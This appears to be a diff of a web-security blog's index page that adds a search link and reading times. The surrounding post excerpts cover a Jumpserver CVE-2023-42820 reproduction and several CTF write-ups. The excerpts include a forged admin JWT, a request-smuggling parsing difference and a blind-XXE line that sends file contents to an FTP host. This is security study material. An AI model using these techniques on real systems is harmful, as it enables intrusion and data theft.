@@ -20,6 +20,7 @@
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
 <link rel="alternate" type="application/rss+xml" href="https://zoiltin.github.io/index.xml">
+<link rel="alternate" type="application/json" href="https://zoiltin.github.io/index.json">
 <link rel="alternate" hreflang="en" href="https://zoiltin.github.io/">
 <noscript>
     <style>
@@ -130,6 +131,11 @@
                 </a>
             </li>
             <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
                 <a href="https://zoiltin.github.io/posts" title="Posts">
                     <span>Posts</span>
                 </a>
@@ -143,8 +149,21 @@
     </nav>
 </header>
 <main class="main"> 
+<article class="first-entry home-info">
+    <header class="entry-header">
+        <h1>Web Security</h1>
+    </header>
+    <div class="entry-content">
+        
+    </div>
+    <footer class="entry-footer">
+        <div class="social-icons" >
+</div>
 
-<article class="first-entry"> 
+    </footer>
+</article>
+
+<article class="post-entry"> 
   <header class="entry-header">
     <h2 class="entry-hint-parent">Jumpserver随机数预测漏洞(CVE-2023-42820)复现
     </h2>
@@ -160,7 +179,7 @@ jumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而�
 urlpatterns = [ re_path( r&#34;image/(?P&lt;key&gt;\w&#43;)/$&#34;, views.captcha_image, name=&#34;captcha-image&#34;, kwargs={&#34;scale&#34;: 1}, ), re_path( r&#34;image/(?P&lt;key&gt;\w&#43;)@2/$&#34;, views.captcha_image, name=&#34;captcha-image-2x&#34;, kwargs={&#34;scale&#34;: 2}, ), re_path(r&#34;audio/(?P&lt;key&gt;\w&#43;).wav$&#34;, views.captcha_audio, name=&#34;captcha-audio&#34;), re_path(r&#34;refresh/$&#34;, views.captcha_refresh, name=&#34;captcha-refresh&#34;), ] 验证码刷新代码：
 def captcha_refresh(request): &#34;&#34;&#34;Return json with new captcha for ajax refresh request&#34;&#34;&#34; if not request.headers.get(&#34;x-requested-with&#34;) == &#34;XMLHttpRequest&#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls....</p>
   </div>
-  <footer class="entry-footer"><span title='2024-11-20 19:12:11 +0000 UTC'>November 20, 2024</span></footer>
+  <footer class="entry-footer"><span title='2024-11-20 19:12:11 +0000 UTC'>November 20, 2024</span>&nbsp;·&nbsp;8 min</footer>
   <a class="entry-link" aria-label="post link to Jumpserver随机数预测漏洞(CVE-2023-42820)复现" href="https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/"></a>
 </article>
 
@@ -178,7 +197,7 @@ def captcha_refresh(request): &#34;&#34;&#34;Return json with new captcha for aj
 入口 @Mapping(&#34;/render&#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(&#34;render.htm&#34;); if (pass != null &amp;&amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(&#34;msg&#34;, getMD5Hash(result)); } else { model.put(&#34;msg&#34;, &#34;Render Page&#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。
 public Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode !...</p>
   </div>
-  <footer class="entry-footer"><span title='2024-07-27 18:21:03 +0800 CST'>July 27, 2024</span></footer>
+  <footer class="entry-footer"><span title='2024-07-27 18:21:03 +0800 CST'>July 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
   <a class="entry-link" aria-label="post link to Ciscn 2024 final Fobee wp" href="https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/"></a>
 </article>
 
@@ -193,7 +212,7 @@ jwt绕过 def get_key(kid): key = &#34;&#34; dir = &#34;/app/&#34; try: with ope
 print(jwt.encode({&#34;username&#34;:&#34;admin&#34;,&#34;isadmin&#34;:true}, key, algorithm=&#34;HS256&#34;, headers={&#34;kid&#34;: &#34;frontend_keyasdasd&#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。
 headers = {key: value for (key, value) in request.headers if key != &#39;Host&#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：...</p>
   </div>
-  <footer class="entry-footer"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span></footer>
+  <footer class="entry-footer"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span>&nbsp;·&nbsp;6 min</footer>
   <a class="entry-link" aria-label="post link to d3ctf-2024-web-wp" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"></a>
 </article>
 
@@ -208,7 +227,7 @@ const protobuf = require(&#34;protobufjs&#34;); protobuf.parse(&#39;option(a).co
 app.post(&#39;/create&#39;, (req, res) =&gt; { requestBody=req.body try{ schema = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;); root = protobuf.parse(schema).root; Note = root.lookupType(&#39;Note&#39;); [...] 在/customise可以修改settings.proto文件。
 app.post(&#39;/customise&#39;,(req, res) =&gt; { try { const { data } = req.body; let author = data.pop()[&#39;author&#39;]; let title = data.pop()[&#39;title&#39;]; let protoContents = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;).split(&#39;\n&#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=&#34;user&#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=&#34;user&#34;];`; } fs....</p>
   </div>
-  <footer class="entry-footer"><span title='2024-02-27 15:33:01 +0000 UTC'>February 27, 2024</span></footer>
+  <footer class="entry-footer"><span title='2024-02-27 15:33:01 +0000 UTC'>February 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
   <a class="entry-link" aria-label="post link to bi0s CTF 2024 wp" href="https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/"></a>
 </article>
 
@@ -224,7 +243,7 @@ module movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}
 # 转换为十六进制 print(&#34;0x&#34;) for i in &#34;MoveBitCTF&#34;: print(hex(ord(i)).replace(&#34;0x&#34;,&#34;&#34;),end=&#34;&#34;) 调用即可：
 sui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200...</p>
   </div>
-  <footer class="entry-footer"><span title='2024-01-13 08:48:17 +0000 UTC'>January 13, 2024</span></footer>
+  <footer class="entry-footer"><span title='2024-01-13 08:48:17 +0000 UTC'>January 13, 2024</span>&nbsp;·&nbsp;10 min</footer>
   <a class="entry-link" aria-label="post link to movectf_2024_wp" href="https://zoiltin.github.io/posts/movectf-2024-wp/"></a>
 </article>
 
@@ -246,7 +265,7 @@ ftp://协议比较简单，脚本很容易实现。
 在高版本也可以十分有限的利用：
 ftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 </p>
   </div>
-  <footer class="entry-footer"><span title='2023-11-22 15:16:46 +0000 UTC'>November 22, 2023</span></footer>
+  <footer class="entry-footer"><span title='2023-11-22 15:16:46 +0000 UTC'>November 22, 2023</span>&nbsp;·&nbsp;1 min</footer>
   <a class="entry-link" aria-label="post link to 盲XXE中FTP协议的利用" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"></a>
 </article>
     </main>
